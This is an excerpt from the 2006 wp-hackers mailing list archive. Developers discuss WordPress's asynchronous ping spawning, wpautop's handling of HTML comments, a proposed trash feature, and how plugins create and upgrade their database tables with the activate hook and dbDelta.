Sent: Tuesday, April 25, 2006 12:45 AM
To: wp-hackers@lists.automattic.com
Subject: RE: [wp-hackers] RE: A quick update on the
securityissueI'dmentionedtoday
Importance: Low




> > it.  But I'd rather keep it out of Google as much as possible...
> 
> Does security by obscurity ever work?

Posting detailed howtos on billboards certainly doesn't. :)

D.

_______________________________________________
wp-hackers mailing list
wp-hackers@lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From davebytes at comcast.net  Tue Apr 25 06:10:39 2006
From: davebytes at comcast.net (David Chait)
Date: Tue Apr 25 06:14:08 2006
Subject: [wp-hackers] Questions on execute-pings.php...
References: <MJEEIIFCKOJBBNFPJGJCKEPHLDAA.angsuman@taragana.com>
Message-ID: <004e01c6682e$fa751800$6e01a8c0@sixfour>

Ahh. Yes, IF you sit around in C or Java or PHP and WAIT on the socket, then 
it's no improvement (in fact it's worse).

However, we're not talking about sitting and spinning synchronously on some 
data on the socket.  In fact, I'm not sure the socket is left open on the 
client (I believe you open a socket, send a GET (or whatever), close the 
socket).  I think.  The server goes merrily on its way (despite the socket 
closing on the remote end, since it is doing things...), thus gaining async 
processing.  Though, even if a socket closing would stop server execution 
(which might be the CGI case explained by Andy), at the worst you'd open the 
socket very early, and close it very late, at least gaining parallelism. 
And I seem to recall w/sockets you can tell it to "close gracefully", and 
then it's up to a driver-level layer to do so...

Anyway... We can always take this off-list, though I think up to this point 
it may be of interest to some budding coders... ;)

-d

----- Original Message ----- 
From: "Angsuman Chakraborty" <angsuman@taragana.com>
To: <wp-hackers@lists.automattic.com>
Sent: Tuesday, April 25, 2006 12:48 AM
Subject: RE: [wp-hackers] Questions on execute-pings.php...


> Why isn't it true for C/Java?  You open up a socket to a webserver.  That
spawns a 'thread' of execution of some sort to handle the connection.

It doesn't (on the client side or the side making the request) unless you 
explicitly spawn one to connect to the server. In this case the code is 
synchronously opening the socket and pasing some data.

Note: It does spawn (or resuse) a thread (or process) on the server side but 
that doesn't help the client making the request as it is waiting for the 
request processing to complete. The only way I can see to make this viable 
is to send UDP packets or explicitly spawn a thread. Can you create threads 
in php? I think not. The nearest I could find was ticks. But then even that 
most likely doesn't work when the request handling thread / process 
completes execution.

Thoughts?

> not just making it up. ;)

I too hope so :) though I simply cannot fathom the logic. I wish the author 
of this code would shed some light too.

From angsuman at taragana.com  Tue Apr 25 06:38:00 2006
From: angsuman at taragana.com (Angsuman Chakraborty)
Date: Tue Apr 25 06:43:36 2006
Subject: [wp-hackers] Questions on execute-pings.php...
In-Reply-To: <e6ec604d0604241658w52de3743t1fc549f90c4c3712@mail.gmail.com>
Message-ID: <MJEEIIFCKOJBBNFPJGJCEEBLLEAA.angsuman@taragana.com>

> Now some other folks have had their fingers in the code and I don't
know what it's doing.

At this point it is simply calling the execute-pings in a convoluted (network error prone) and slower way without any visible benefits (unless you are relying on 0.1 timeout of socket connection to kick in and fail the process occasionally). Additionally the spawn method (which isn't really spawning anything) is also called from admin interface in the footer. It simply looks like a worse solution as it stands today.

Also there is the question as to why it is not checking for post_date before issuing pingbacks and trackbacks. Pingbacks cannot be verified until the blog is actually published and visible on site. 

I would think a better a flexible solution would be to plug pingback, trackback, enclosure and pings to publish_post action event. The code requires some refactoring.

Thoughts?

Best,
Angsuman

-----Original Message-----
From: wp-hackers-bounces@lists.automattic.com
[mailto:wp-hackers-bounces@lists.automattic.com]On Behalf Of Andy
Skelton
Sent: Tuesday, April 25, 2006 5:29 AM
To: wp-hackers@lists.automattic.com
Subject: Re: [wp-hackers] Questions on execute-pings.php...
Importance: Low


On 4/24/06, David Chait <davebytes@comcast.net> wrote:
> I would assume/presume the person who added that code had done testing --
> and maybe had copied the approach from another project, not just making it
> up. ;)

No, I made it up.

Actually somebody had the bright idea of an iframe so that the browser
would be the middleman. This worked much of the time but failed when
the browser's next page wasn't an admin page, as can happen when
publishing from other tools than the usual Write Post screen, or
posting via XMLRPC.

My solution to that was to spawn the new thread via HTTP request from
the server itself. (Thus was born Argyle.) Now a post from an XMLRPC
client would spawn the pinger without relying on the user to visit the
dashboard, triggering the pinger via iframe. This worked on almost all
server configs. Certain CGI setups didn't work this way due to a PHP
bug so we forked the code for them: if CGI, use iframe instead of
HTTP.

This was all done in the interest of reducing the apparent delay when
posting, which was caused by waiting for so many remote servers to
respond to the pings.

Now some other folks have had their fingers in the code and I don't
know what it's doing. I hope the history lesson has some value anyway.
:-)

Andy
_______________________________________________
wp-hackers mailing list
wp-hackers@lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From ryan at boren.nu  Tue Apr 25 07:38:02 2006
From: ryan at boren.nu (Ryan Boren)
Date: Tue Apr 25 07:42:12 2006
Subject: [wp-hackers] Questions on execute-pings.php...
In-Reply-To: <MJEEIIFCKOJBBNFPJGJCEEBLLEAA.angsuman@taragana.com>
References: <MJEEIIFCKOJBBNFPJGJCEEBLLEAA.angsuman@taragana.com>
Message-ID: <444DD1DA.7070300@boren.nu>

Angsuman Chakraborty wrote:
> At this point it is simply calling the execute-pings in a convoluted (network error prone) and slower way without any visible benefits (unless you are relying on 0.1 timeout of socket connection to kick in and fail the process occasionally). Additionally the spawn method (which isn't really spawning anything) is also called from admin interface in the footer. It simply looks like a worse solution as it stands today.
> 
> Also there is the question as to why it is not checking for post_date before issuing pingbacks and trackbacks. Pingbacks cannot be verified until the blog is actually published and visible on site. 
> 
> I would think a better a flexible solution would be to plug pingback, trackback, enclosure and pings to publish_post action event. The code requires some refactoring.
> 
> Thoughts?

It's a fairly common trick to issue a GET through fsockopen and not wait 
for an answer as a way to perform tasks asyncronously.  The problems we 
were having in certain environments might be fixed by calling 
ignore_user_abort() and set_time_limit() in the script being called in 
the GET request.

Anyway,

1. Look at the latest code in subversion. It's a bit different and 
addresses some of your points.
2. Code something better that still addresses the problem. :-)

Ryan
From dmhouse at gmail.com  Tue Apr 25 07:45:10 2006
From: dmhouse at gmail.com (David House)
Date: Tue Apr 25 07:49:22 2006
Subject: [wp-hackers] Questions on execute-pings.php...
In-Reply-To: <MJEEIIFCKOJBBNFPJGJCEEBLLEAA.angsuman@taragana.com>
References: <e6ec604d0604241658w52de3743t1fc549f90c4c3712@mail.gmail.com>
	<MJEEIIFCKOJBBNFPJGJCEEBLLEAA.angsuman@taragana.com>
Message-ID: <ebe43d680604250045i1cba69cp89bc9dfbd8de7a2c@mail.gmail.com>

On 25/04/06, Angsuman Chakraborty <angsuman@taragana.com> wrote:
> I would think a better a flexible solution would be to plug pingback, trackback, enclosure and pings to publish_post action event. The code requires some refactoring.

publish_post is fired when the user hits the "Publish" button, not
when a future-dated post first appears on the front page. We use a
cron-style system to send the pings exactly when they're first valid.

Robert Deaton already explained this. Andy Skelton explained the
asyncronous part. I would have thought you'd have read those two
emails, but judging from your questions, it appears you haven't.
Please do.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From andy at yellowswordfish.com  Tue Apr 25 08:30:29 2006
From: andy at yellowswordfish.com (Andy Staines)
Date: Tue Apr 25 08:34:42 2006
Subject: [wp-hackers] A Question On Plugins
Message-ID: <6BDE5FA1-62DF-457A-BDFB-A4BD4E869892@yellowswordfish.com>

I know you guys are in the middle of a big security conference but  
can a relatively newbie plugin author - struggling to find  
documentation to help him - ask a question or two? And - is this the  
right place to be asking?

One of my plugins requires two tables to be created. I coded this up  
as a process in the 'activate' plugin hook. But for at least two  
people (and maybe more) when they have activated the plugin, the  
tables have not been set up. They are administrators of their blogs.

Is this the 'right' way to ensure tables get created or is there a  
better hook to use? And, if so, any ideas why it should fail?

regards
Andy
www.yellowswordfish.com

From mike at zed1.com  Tue Apr 25 08:35:44 2006
From: mike at zed1.com (Mike Little)
Date: Tue Apr 25 08:39:58 2006
Subject: [wp-hackers] Re: [wp-trac] Re: [WordPress Trac] #2691: HTML
	comments in posts aren't handled properly.
In-Reply-To: <070.e9c466bc92336c9a6b232caf60e9f25f@lists.automattic.com>
References: <061.40aab27f9e9647c3f555b886d569da05@lists.automattic.com>
	<070.e9c466bc92336c9a6b232caf60e9f25f@lists.automattic.com>
Message-ID: <7235ce780604250135h2f8dd85cie0383e70949b8990@mail.gmail.com>

On 4/25/06, WordPress Trac <wp-trac@lists.automattic.com> wrote:
> #2691: HTML comments in posts aren't handled properly.
> -----------------------+----------------------------------------------------
>        Id:  2691       |      Status:  new
> Component:  General    |    Modified:  Tue Apr 25 07:51:49 2006
>  Severity:  normal     |   Milestone:
>  Priority:  normal     |     Version:  2.0
>     Owner:  anonymous  |    Reporter:  gord
> -----------------------+----------------------------------------------------

>  When an HTML comment is added in a post, autop adds paragraph ( <p> ) tags
>  around the comment and for multi-line comments line breaks ( <br /> ) are
>  added after every line.  This should not happen in HTML comments.
>
>  This ticket is similar to #712 which was closed with wontfix.  I would
>  like to know why this isn't seen as an issue?  It prevents the addition of
>  RDF and other metadata, not to mention just plain old HTML comments in
>  posts.
>
...

> Comment (by skeltoac):
>
>  This is what is implied: nobody who has seen this has found it important
>  enough to spend their time rewriting autop to work around comments. The
>  applicable mantra is "edge case." You are welcome to work up a patch and
>  submit it for testing and consideration.
>

So, along with dropping the accessibility of WordPress admin, because,
presumably, all those blind, partially-sighted, and physically
disabled people are 'edge case'; we are now dropping the 'standards
compliant' part of WordPress

Whatever happened to:

"WordPress is a state-of-the-art semantic personal publishing platform
with a focus on aesthetics, web standards, and usability."

Oh wait! It's still there on the web site, perhaps it needs removing.
Or perhaps it needs rewording: Try dropping 'usability' and 'web
standards'. Perhaps add 'coolness' and 'buzz word compliance'.


Mike
--
Mike Little
http://zed1.com/
From leftjustified at gmail.com  Tue Apr 25 08:54:10 2006
From: leftjustified at gmail.com (Andrew Krespanis)
Date: Tue Apr 25 08:58:24 2006
Subject: [wp-hackers] Re: [wp-trac] Re: [WordPress Trac] #2691: HTML
	comments in posts aren't handled properly.
In-Reply-To: <7235ce780604250135h2f8dd85cie0383e70949b8990@mail.gmail.com>
References: <061.40aab27f9e9647c3f555b886d569da05@lists.automattic.com>
	<070.e9c466bc92336c9a6b232caf60e9f25f@lists.automattic.com>
	<7235ce780604250135h2f8dd85cie0383e70949b8990@mail.gmail.com>
Message-ID: <6453a6e90604250154i779a92dme30eb2df919fd344@mail.gmail.com>

I had a look at wpautop and took a stab at it some time last weekend,
unfortunately my regex skillz aren't up to the task :(
At the moment HTML comments cause extra whitespace on-screen caused by
the <br /> or <p></p> (depending on whether a single or double line
break precedes the comment)

+1 for someone with skills taking it on :)
From lists at viper007bond.com  Tue Apr 25 10:49:18 2006
From: lists at viper007bond.com (Viper007Bond)
Date: Tue Apr 25 10:53:34 2006
Subject: [wp-hackers] A Question On Plugins
In-Reply-To: <6BDE5FA1-62DF-457A-BDFB-A4BD4E869892@yellowswordfish.com>
References: <6BDE5FA1-62DF-457A-BDFB-A4BD4E869892@yellowswordfish.com>
Message-ID: <444DFEAE.6050204@viper007bond.com>

http://codex.wordpress.org/Creating_Tables_with_Plugins

I have yet to code a plugin that uses it's own table (I prefer to store 
my data in a big array in the options table), but I'd probably 
personally avoid using the action hook as from you found out, it doesn't 
always work for one reason or another.

So, the only other way I can think of is checking every time the plugin 
is used (not on every page load) and only once per page. Either that, 
using an option value to record that the table's been made. But of 
course both of those make a query occur, so it's kinda up to you.

-Viper

Andy Staines wrote:
> I know you guys are in the middle of a big security conference but can a 
> relatively newbie plugin author - struggling to find documentation to 
> help him - ask a question or two? And - is this the right place to be 
> asking?
> 
> One of my plugins requires two tables to be created. I coded this up as 
> a process in the 'activate' plugin hook. But for at least two people 
> (and maybe more) when they have activated the plugin, the tables have 
> not been set up. They are administrators of their blogs.
> 
> Is this the 'right' way to ensure tables get created or is there a 
> better hook to use? And, if so, any ideas why it should fail?
> 
> regards
> Andy
> www.yellowswordfish.com
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
From andy at yellowswordfish.com  Tue Apr 25 11:02:44 2006
From: andy at yellowswordfish.com (Andy Staines)
Date: Tue Apr 25 11:06:58 2006
Subject: [wp-hackers] A Question On Plugins
In-Reply-To: <444DFEAE.6050204@viper007bond.com>
References: <6BDE5FA1-62DF-457A-BDFB-A4BD4E869892@yellowswordfish.com>
	<444DFEAE.6050204@viper007bond.com>
Message-ID: <CD1AF10A-FBE1-4FAA-A21D-4E013318D118@yellowswordfish.com>

Thanks Viper
I have coded up a 'version' option in the options table so I can at  
least check when the admin panel is loaded. As you say - painful that  
it is just another query but it was the only other thing I could  
think of.
There must be fixable reasons why the 'activate' hook doesn't work  
though. I actually now recall having this problem myself with a third- 
party plugin...
Thanks again
Andy


On 11:49  AM |  Tue 25 Apr 06, at 11:49  AM |  25 Apr 06,  
Viper007Bond wrote:

> http://codex.wordpress.org/Creating_Tables_with_Plugins
>
> I have yet to code a plugin that uses it's own table (I prefer to  
> store my data in a big array in the options table), but I'd  
> probably personally avoid using the action hook as from you found  
> out, it doesn't always work for one reason or another.
>
> So, the only other way I can think of is checking every time the  
> plugin is used (not on every page load) and only once per page.  
> Either that, using an option value to record that the table's been  
> made. But of course both of those make a query occur, so it's kinda  
> up to you.
>
> -Viper
>
> Andy Staines wrote:
>> I know you guys are in the middle of a big security conference but  
>> can a relatively newbie plugin author - struggling to find  
>> documentation to help him - ask a question or two? And - is this  
>> the right place to be asking?
>> One of my plugins requires two tables to be created. I coded this  
>> up as a process in the 'activate' plugin hook. But for at least  
>> two people (and maybe more) when they have activated the plugin,  
>> the tables have not been set up. They are administrators of their  
>> blogs.
>> Is this the 'right' way to ensure tables get created or is there a  
>> better hook to use? And, if so, any ideas why it should fail?
>> regards
>> Andy
>> www.yellowswordfish.com
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers@lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From ringmaster at midnightcircus.com  Tue Apr 25 11:23:04 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Tue Apr 25 11:27:22 2006
Subject: [wp-hackers] Questions on execute-pings.php...
In-Reply-To: <ebe43d680604250045i1cba69cp89bc9dfbd8de7a2c@mail.gmail.com>
References: <e6ec604d0604241658w52de3743t1fc549f90c4c3712@mail.gmail.com>
	<MJEEIIFCKOJBBNFPJGJCEEBLLEAA.angsuman@taragana.com>
	<ebe43d680604250045i1cba69cp89bc9dfbd8de7a2c@mail.gmail.com>
Message-ID: <444E0698.30403@midnightcircus.com>

David House wrote:
> Robert Deaton already explained this. Andy Skelton explained the
> asyncronous part. I would have thought you'd have read those two
> emails, but judging from your questions, it appears you haven't.
> Please do.

Another key part of the puzzle that nobody explicitly mentioned is that 
posts in the future do not have a post_status of "publish" in 2.1.  So 
if you're querying for just "publish", then you're not getting the 
future posts at all.

Owen
From elharo at metalab.unc.edu  Tue Apr 25 11:29:35 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Tue Apr 25 11:34:24 2006
Subject: [wp-hackers] Re: [wp-trac] Re: [WordPress Trac] #2691:
	HTML	comments in posts aren't handled properly.
In-Reply-To: <7235ce780604250135h2f8dd85cie0383e70949b8990@mail.gmail.com>
References: <061.40aab27f9e9647c3f555b886d569da05@lists.automattic.com>	<070.e9c466bc92336c9a6b232caf60e9f25f@lists.automattic.com>
	<7235ce780604250135h2f8dd85cie0383e70949b8990@mail.gmail.com>
Message-ID: <444E081F.6020004@metalab.unc.edu>

Mike Little wrote:

>>  This ticket is similar to #712 which was closed with wontfix.  I would
>>  like to know why this isn't seen as an issue?  It prevents the addition of
>>  RDF and other metadata, not to mention just plain old HTML comments in
>>  posts.
>>
> ...
> 
>> Comment (by skeltoac):
>>
>>  This is what is implied: nobody who has seen this has found it important
>>  enough to spend their time rewriting autop to work around comments. The
>>  applicable mantra is "edge case." You are welcome to work up a patch and
>>  submit it for testing and consideration.
>>

If you're willing to accept a patch, please don't close it as wontfix. 
First of all, people looking for something to contribute usually won't 
search for wontfix issues. Secondly wontfix usually indicates that 
you've made a conscious decision that fixing the bug would have other 
negative consequences, and therefore you're going to live with the bug.

If that's not the case, then it would be helpful to leave the bug open 
or schedule it to a future version of WordPress so other people may 
eventually find it and fix it.

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From elharo at metalab.unc.edu  Tue Apr 25 11:31:41 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Tue Apr 25 11:36:29 2006
Subject: [wp-hackers] Reposting my lost chronicle: Revisiting the	'Trash
	Can' idea...
In-Reply-To: <20060425011604.ev85o7ldyinwc4cw@banana.catalyst2.com>
References: <015901c667c3$2fc9dd40$6e01a8c0@sixfour>
	<20060425011604.ev85o7ldyinwc4cw@banana.catalyst2.com>
Message-ID: <444E089D.8050108@metalab.unc.edu>

Roy Schestowitz wrote:

> My initial instinct was to say that it would lead to confusion, much like
> deletion in IMAP mail folders. After a second thought, I realised it would
> be an essential feature to some, so should probably be implemented as a
> plug-in. Think of it as thought it was tab snapback in Mozilla Firefox.
> There is one additional concern which is privacy, which is the cost of
> having an extra layer to deletion. Trash can annoy the user sometimes
> because they facilitate a two-tiered deletion, despite a confirmation
> prompt, which makes it three-tiered..

It doesn't have to be two-tiered. Delete could move a message to the 
trash. Then a non-user interactive process could periodically purge all 
messages older than some fixed time interval: e.g. 7 days. The interval 
could be user configurable. Anyone with extreme privacy needs could set 
the interval to 0 to delete immediately with no easy recovery.

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From wphackers at jamietalbot.com  Tue Apr 25 13:34:01 2006
From: wphackers at jamietalbot.com (Jamie Talbot)
Date: Tue Apr 25 14:38:35 2006
Subject: [wp-hackers] A Question On Plugins
In-Reply-To: <6BDE5FA1-62DF-457A-BDFB-A4BD4E869892@yellowswordfish.com>
References: <6BDE5FA1-62DF-457A-BDFB-A4BD4E869892@yellowswordfish.com>
Message-ID: <444E2549.3060002@jamietalbot.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Andy Staines wrote:
> One of my plugins requires two tables to be created. I coded this up as
> a process in the 'activate' plugin hook. But for at least two people
> (and maybe more) when they have activated the plugin, the tables have
> not been set up. They are administrators of their blogs.
> 
> Is this the 'right' way to ensure tables get created or is there a
> better hook to use? And, if so, any ideas why it should fail?

One thing to remember is that the activate hook is dependent on the plugin name.  At first, I was
confused because I'd installed the plugin to its own directory, but not included that in the plugin
hook.  As in using:

add_action('activate_pluginname.php', array(&$this, 'activated'));

instead of:

add_action('activate_pluginname/pluginname.php', array(&$this, 'activated'));

Where the plugin files were in the directory 'wp-content/plugins/pluginname/'.  Other than them
installing to the wrong directory, no idea why it might be failing.  In any case, I decided to add
my tables on the first view of an options page, then used the activate hook to redirect the user
straight to that page when the plugin was first installed, instead of going back to the plugins
page.  That way, even if the activation screws up, my tables will still be created when they look at
the config page.

Cheers,

Jamie.

- --
http://jamietalbot.com
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.5 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFETiVJrovxfShShFARAkyBAJ9lQ8ipxBQHIDrZozETx8GXOJQMHgCeNtfG
hL0s97J+lBzz3z/fiWdsq64=
=m6yF
-----END PGP SIGNATURE-----
From andy at yellowswordfish.com  Tue Apr 25 14:43:44 2006
From: andy at yellowswordfish.com (Andy Staines)
Date: Tue Apr 25 14:47:56 2006
Subject: [wp-hackers] A Question On Plugins
In-Reply-To: <444E2549.3060002@jamietalbot.com>
References: <6BDE5FA1-62DF-457A-BDFB-A4BD4E869892@yellowswordfish.com>
	<444E2549.3060002@jamietalbot.com>
Message-ID: <9205D42E-B96F-4DAA-8B19-B15D5AEAB197@yellowswordfish.com>

Thanks Jamie. I am doing that bit OK. The weird thing is that I have  
quite a few users of this plugin - all successful - but just two have  
reported this problem.
They are the sort of bugs you just hate!
andy

On 02:34  PM |  Tue 25 Apr 06, at 02:34  PM |  25 Apr 06, Jamie  
Talbot wrote:

> -----BEGIN PGP SIGNED MESSAGE-----
> Hash: SHA1
>
> Andy Staines wrote:
>> One of my plugins requires two tables to be created. I coded this  
>> up as
>> a process in the 'activate' plugin hook. But for at least two people
>> (and maybe more) when they have activated the plugin, the tables have
>> not been set up. They are administrators of their blogs.
>>
>> Is this the 'right' way to ensure tables get created or is there a
>> better hook to use? And, if so, any ideas why it should fail?
>
> One thing to remember is that the activate hook is dependent on the  
> plugin name.  At first, I was
> confused because I'd installed the plugin to its own directory, but  
> not included that in the plugin
> hook.  As in using:
>
> add_action('activate_pluginname.php', array(&$this, 'activated'));
>
> instead of:
>
> add_action('activate_pluginname/pluginname.php', array(&$this,  
> 'activated'));
>
> Where the plugin files were in the directory 'wp-content/plugins/ 
> pluginname/'.  Other than them
> installing to the wrong directory, no idea why it might be  
> failing.  In any case, I decided to add
> my tables on the first view of an options page, then used the  
> activate hook to redirect the user
> straight to that page when the plugin was first installed, instead  
> of going back to the plugins
> page.  That way, even if the activation screws up, my tables will  
> still be created when they look at
> the config page.
>
> Cheers,
>
> Jamie.
>
> - --
> http://jamietalbot.com
> -----BEGIN PGP SIGNATURE-----
> Version: GnuPG v1.2.5 (MingW32)
> Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
>
> iD8DBQFETiVJrovxfShShFARAkyBAJ9lQ8ipxBQHIDrZozETx8GXOJQMHgCeNtfG
> hL0s97J+lBzz3z/fiWdsq64=
> =m6yF
> -----END PGP SIGNATURE-----
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From skeltoac at gmail.com  Tue Apr 25 14:47:31 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Tue Apr 25 14:51:44 2006
Subject: [wp-hackers] A Question On Plugins
In-Reply-To: <6BDE5FA1-62DF-457A-BDFB-A4BD4E869892@yellowswordfish.com>
References: <6BDE5FA1-62DF-457A-BDFB-A4BD4E869892@yellowswordfish.com>
Message-ID: <e6ec604d0604250747h4c454783yba783d4368e87b52@mail.gmail.com>

On 4/25/06, Andy Staines <andy@yellowswordfish.com> wrote:
> I know you guys are in the middle of a big security conference but

hehe

> Is this the 'right' way to ensure tables get created or is there a
> better hook to use? And, if so, any ideas why it should fail?

I do it a bit differently. This method had the added benefit of
letting you upgrade the tables just like WP does.

Save your plugin db version as an option. Check the option on every
page load. It's autoloaded so the cost of this operation is trivial.

If the db version in the option is outdated or missing:
$my_queries = "CREATE TABLE foo (...); CREATE TABLE bar (...);"
require_once(ABSPATH/wp-admin/upgrade-functions.php);
dbDelta($my_queries);
update your db version option.

Of course, you'll have to clean up that code and make it your own.

When you update the plugin with new table schema, just update
$my_queries and bump the db_version coded in your plugin. It'll see
the outdated version in the options table and run the upgrade.

Cheers,
Andy
From r at robm.me.uk  Tue Apr 25 14:49:17 2006
From: r at robm.me.uk (Rob)
Date: Tue Apr 25 14:52:35 2006
Subject: [wp-hackers] A Question On Plugins
In-Reply-To: <9205D42E-B96F-4DAA-8B19-B15D5AEAB197@yellowswordfish.com>
References: <6BDE5FA1-62DF-457A-BDFB-A4BD4E869892@yellowswordfish.com>	<444E2549.3060002@jamietalbot.com>
	<9205D42E-B96F-4DAA-8B19-B15D5AEAB197@yellowswordfish.com>
Message-ID: <444E36ED.8040903@robm.me.uk>

Andy Staines wrote:
> Thanks Jamie. I am doing that bit OK. The weird thing is that I have 
> quite a few users of this plugin - all successful - but just two have 
> reported this problem.
> They are the sort of bugs you just hate!
> andy
>
> On 02:34  PM |  Tue 25 Apr 06, at 02:34  PM |  25 Apr 06, Jamie Talbot 
> wrote:
Are they using an old version of WP? IIRC, the activation hook was only 
added in 2.0.

-- 
Rob Miller
http://robm.me.uk/ | http://kantian.co.uk/

From andy at yellowswordfish.com  Tue Apr 25 14:43:44 2006
From: andy at yellowswordfish.com (Andy Staines)
Date: Tue Apr 25 14:54:01 2006
Subject: [wp-hackers] A Question On Plugins
In-Reply-To: <444E2549.3060002@jamietalbot.com>
References: <6BDE5FA1-62DF-457A-BDFB-A4BD4E869892@yellowswordfish.com>
	<444E2549.3060002@jamietalbot.com>
Message-ID: <9205D42E-B96F-4DAA-8B19-B15D5AEAB197@yellowswordfish.com>

Thanks Jamie. I am doing that bit OK. The weird thing is that I have  
quite a few users of this plugin - all successful - but just two have  
reported this problem.
They are the sort of bugs you just hate!
andy

On 02:34  PM |  Tue 25 Apr 06, at 02:34  PM |  25 Apr 06, Jamie  
Talbot wrote:

> -----BEGIN PGP SIGNED MESSAGE-----
> Hash: SHA1
>
> Andy Staines wrote:
>> One of my plugins requires two tables to be created. I coded this  
>> up as
>> a process in the 'activate' plugin hook. But for at least two people
>> (and maybe more) when they have activated the plugin, the tables have
>> not been set up. They are administrators of their blogs.
>>
>> Is this the 'right' way to ensure tables get created or is there a
>> better hook to use? And, if so, any ideas why it should fail?
>
> One thing to remember is that the activate hook is dependent on the  
> plugin name.  At first, I was
> confused because I'd installed the plugin to its own directory, but  
> not included that in the plugin
> hook.  As in using:
>
> add_action('activate_pluginname.php', array(&$this, 'activated'));
>
> instead of:
>
> add_action('activate_pluginname/pluginname.php', array(&$this,  
> 'activated'));
>
> Where the plugin files were in the directory 'wp-content/plugins/ 
> pluginname/'.  Other than them
> installing to the wrong directory, no idea why it might be  
> failing.  In any case, I decided to add
> my tables on the first view of an options page, then used the  
> activate hook to redirect the user
> straight to that page when the plugin was first installed, instead  
> of going back to the plugins
> page.  That way, even if the activation screws up, my tables will  
> still be created when they look at
> the config page.
>
> Cheers,
>
> Jamie.
>
> - --
> http://jamietalbot.com
> -----BEGIN PGP SIGNATURE-----
> Version: GnuPG v1.2.5 (MingW32)
> Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
>
> iD8DBQFETiVJrovxfShShFARAkyBAJ9lQ8ipxBQHIDrZozETx8GXOJQMHgCeNtfG
> hL0s97J+lBzz3z/fiWdsq64=
> =m6yF
> -----END PGP SIGNATURE-----
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From wphackers at jamietalbot.com  Tue Apr 25 14:00:43 2006
From: wphackers at jamietalbot.com (Jamie Talbot)
Date: Tue Apr 25 15:06:26 2006
Subject: [wp-hackers] dbDelta and duplicated indices (WAS: A Question
	On Plugins)
In-Reply-To: <e6ec604d0604250747h4c454783yba783d4368e87b52@mail.gmail.com>
References: <6BDE5FA1-62DF-457A-BDFB-A4BD4E869892@yellowswordfish.com>
	<e6ec604d0604250747h4c454783yba783d4368e87b52@mail.gmail.com>
Message-ID: <444E2B8B.8010008@jamietalbot.com>

Andy Skelton wrote:
> If the db version in the option is outdated or missing:
> $my_queries = "CREATE TABLE foo (...); CREATE TABLE bar (...);"
> require_once(ABSPATH/wp-admin/upgrade-functions.php);
> dbDelta($my_queries);
> update your db version option.

Incidentally, (and just to hijack a little bit) does dbdelta handle multi-column primary keys?  When
the table already exists (say I'm upgrading), I get errors like "multiple key not allowed" unless I
turn errors off.  Also, it seems like UNIQUE indices are duplicated when calling dbdelta repeatedly.
-  Instead of being overwritten, they are just added, without being removed first.  I'm pretty sure
this isn't intended behaviour?  If it isn't, I'll open a ticket...  Can anyone else confirm this
behaviour for other kinds of indices?

Jamie.

--
 http://jamietalbot.com
From andy at yellowswordfish.com  Tue Apr 25 15:13:24 2006
From: andy at yellowswordfish.com (Andy Staines)
Date: Tue Apr 25 15:17:37 2006
Subject: [wp-hackers] A Question On Plugins
In-Reply-To: <e6ec604d0604250747h4c454783yba783d4368e87b52@mail.gmail.com>
References: <6BDE5FA1-62DF-457A-BDFB-A4BD4E869892@yellowswordfish.com>
	<e6ec604d0604250747h4c454783yba783d4368e87b52@mail.gmail.com>
Message-ID: <74231C30-96A0-4642-810F-FE25A883867E@yellowswordfish.com>

Thanks Andy

This is EXACTLY what I have re-coded it to do this morning except not  
knowing about 'dbDelta' I constructed mg own update routine. But I am  
now keeping the db version in Options.

The WP version they are using is a good question and I will enquire -  
but I have specified that the plugin needs Wp2 or above.

On the issue of things like 'dbDelta' are there other, more  
comprehensive resources than the Codex for finding this stuff short  
of trawling through the whole of the WP admin code?

And - as an associated question - having watched this list and read  
Ryans and Owens blog on some things to come in the next release, is  
there a definitive document available to plugin authors detailing all  
the changes so we know what needs to be done to our code to make it  
work? Trac is Ok up to a point but hardly gives a decent description  
of what we really need to know...

thanks again
andy


On 03:47  PM |  Tue 25 Apr 06, at 03:47  PM |  25 Apr 06, Andy  
Skelton wrote:

> On 4/25/06, Andy Staines <andy@yellowswordfish.com> wrote:
>> I know you guys are in the middle of a big security conference but
>
> hehe
>
>> Is this the 'right' way to ensure tables get created or is there a
>> better hook to use? And, if so, any ideas why it should fail?
>
> I do it a bit differently. This method had the added benefit of
> letting you upgrade the tables just like WP does.
>
> Save your plugin db version as an option. Check the option on every
> page load. It's autoloaded so the cost of this operation is trivial.
>
> If the db version in the option is outdated or missing:
> $my_queries = "CREATE TABLE foo (...); CREATE TABLE bar (...);"
> require_once(ABSPATH/wp-admin/upgrade-functions.php);
> dbDelta($my_queries);
> update your db version option.
>
> Of course, you'll have to clean up that code and make it your own.
>
> When you update the plugin with new table schema, just update
> $my_queries and bump the db_version coded in your plugin. It'll see
> the outdated version in the options table and run the upgrade.
>
> Cheers,
> Andy
